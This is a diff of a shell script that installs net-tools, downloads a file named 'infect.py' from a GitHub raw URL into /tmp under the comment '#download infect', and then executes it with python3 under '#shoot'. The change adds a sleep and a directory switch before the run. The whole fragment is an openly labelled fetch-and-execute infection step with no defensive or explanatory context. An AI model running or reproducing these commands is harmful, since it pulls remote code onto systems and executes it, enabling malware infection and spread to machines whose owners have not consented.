@@ -9,6 +9,8 @@ apt-get install net-tools -y
 
 #download infect
 wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
+sleep 3
 
 #shoot
-/usr/bin/python3 /tmp/infect.py
+cd /usr/bin
+python3 /tmp/infect.py
